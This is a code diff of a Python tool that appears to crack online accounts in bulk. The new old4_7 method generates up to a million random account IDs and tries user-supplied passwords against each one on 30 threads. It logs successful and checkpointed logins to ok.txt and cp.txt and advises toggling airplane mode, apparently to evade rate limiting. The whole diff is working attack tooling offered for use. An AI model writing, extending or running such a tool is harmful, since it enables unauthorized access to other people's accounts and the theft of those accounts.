@@ -141,7 +141,7 @@ class Main:
 				exit() 
 		elif hoga in ["2", "02"]:
 			if basesplit in plr:
-				self.old5_8()
+				self.old4_7()
 			else: 
 				notice()
 				exit()
@@ -174,31 +174,32 @@ class Main:
 					coeg.submit(self.api, user, listpass.split(","))
 			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
 		except Exception as e:exit(str(e))
-
-
-	def old5_8(self):
-		x = 111111
-		xx = 999999
-		idx = "100000"
-		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;95m(70,000 MAX): \033[0;92m"))
-		if (limit)>70000:
-			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(D))
+		
+		
+	def old4_7(self):
+		x = 11111111
+		xx = 99999999
+		idx = input("%s [+] ENTER A DIGIT (1-9): %s"%(Y,G))
+		idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
+		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;92m(1000000 MAX): \033[0;92m"))
+		if (limit)>1000000:
+			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(C))
 		try:
 			for n in range(limit):
 				_ = random.randint(x,xx)
 				__ = idx
 				self.id.append(__+str(_))
-			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
+			print("\033[0;93m [+] TOTAL ID -> \033[0;92m%s\033[0;92m"%(len(self.id))) 
 			with ThreadPoolExecutor(max_workers=30) as coeg:
-				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(G,G,B,G))
-				print("%s EXAMPLE : %s123456,1234567,123456789"%(G,B))
-				listpass = input("%s [?] ENTER PASSWORD :%s "%(G,P))
+				print("\n%s [!] USE %s, %s(COMMA)%s FOR REJAUL  "%(G,G,B,G))
+				print("%s EXAMPLE : %s123456,1234567,123456789"%(G,P))
+				listpass = input("%s [?] ENTER PASSWORD :%s "%(G,G))
 				if len(listpass)<=5:
-					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(D))
-				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
+					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(C))
+				print("%s [*] CRACK WITH PASSWORD -> [\033[0;92m%s\033[0;92m]"%(G,listpass))
 				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))
-				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(B))
-				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 3 SECONDS\x1b[0m\n"%(D))
+				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(P))
+				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 3 SECONDS\x1b[0m\n"%(C))
 				for user in self.id:
 					coeg.submit(self.api, user, listpass.split(","))
 			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
